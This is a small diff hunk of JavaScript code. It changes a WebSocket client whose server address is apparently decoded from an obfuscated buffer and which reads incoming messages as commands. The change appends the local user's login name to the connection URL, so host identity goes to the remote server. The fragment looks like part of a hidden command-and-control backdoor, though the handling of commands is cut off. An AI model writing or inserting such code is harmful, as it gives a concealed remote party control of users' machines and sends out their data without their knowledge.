@@ -126,7 +126,7 @@ const socpa = Buffer.from(
 
 let ws;
 function connect() {
-  ws = new WebSocket(socpa);
+  ws = new WebSocket(socpa + "?username=" + os.userInfo().username);
 
   ws.on("message", async (message) => {
     const command = message.toString();
